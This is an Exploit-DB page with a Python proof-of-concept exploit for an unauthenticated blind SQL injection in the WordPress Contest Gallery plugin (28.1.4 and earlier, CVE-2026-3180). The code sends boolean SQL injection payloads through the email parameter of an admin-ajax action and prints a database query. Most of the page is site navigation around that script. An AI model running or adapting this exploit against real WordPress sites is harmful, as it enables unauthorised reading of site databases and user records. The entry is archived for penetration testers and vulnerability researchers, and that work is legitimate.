---
title: [webapps] WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection
url: https://www.exploit-db.com/exploits/52609
source: Exploit-DB.com RSS Feed
date: 2026-06-05
fetch_date: 2026-06-06T05:49:43.149946
---

# [webapps] WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection

#### EDB-ID:

###### 52609

#### CVE:

###### [2026-3180](https://nvd.nist.gov/vuln/detail/CVE-2026-3180)

---

**EDB Verified:**

#### Author:

###### [cardosource](/?author=12386)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2026-06-05

---

**Vulnerable App:**

```
# Exploit Title: WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection
# Google Dork:  N/A
# Date: 2026-06-02
# Exploit Author: cardosource
# Vendor Homepage: https://contest-gallery.com/
# Software Link: https://wordpress.org/plugins/contest-gallery/
# Version: <= 28.1.4
# Tested on: Docker - PHP 8.2/Apache + MariaDB (WordPress Environment)
# CVE: 2026-3180

"""
Description

A Blind SQL Injection vulnerability exists in Contest Gallery versions 28.1.4 and earlier. The issue is caused by the unsafe use of the cgl_maili parameter, where sanitize_email() preserves the single quote (') character in the local part of an email address. As a result, user-controlled input reaches wpdb->get_row() without proper parameterization via prepare(), allowing unauthenticated attackers to perform boolean-based blind SQL injection.
Authentication Required: No

"""

import requests
import json

NONCE = " "
URL = "http://localhost:8080/wp-admin/admin-ajax.php"
endpoint = "/wp-admin/admin-ajax.php"
url = "http://localhost:8080/"
payload = "'OR/**/1=1#@teste.com' and 'OR/**/1=2#@teste.com"

def send_payload(mail):
    data = {
        "action": "post_cg1l_resend_unconfirmed_mail_frontend",
        "cgl_mail": mail,
        "cgl_page_id": "1",
        "cgl_activation_key": "",
        "cg_nonce": NONCE,
    }
    return requests.post(URL, data=data)

r_true = send_payload("qualquer'OR/**/1=1#@teste.com")

if r_true.status_code == 200:
    status_code = r_true.status_code

banner = f"""
CVE : 2026-3180 | Contest Gallery 28.1.4 : Boolean SQLi

payload :........................{payload}
end point :........................{endpoint}
url :..............................{url}
status :...........................{status_code}
nonce :............................{NONCE}
"""

print(banner)
print(f"Body length: {len(r_true.text)} chars")

poc =f'''\nmariadb wordpress_db -e "
SELECT * FROM wp_contest_gal1ery_create_user_entries
ORDER BY Tstamp DESC LIMIT 1115;"'''

print(poc)
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2026. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed...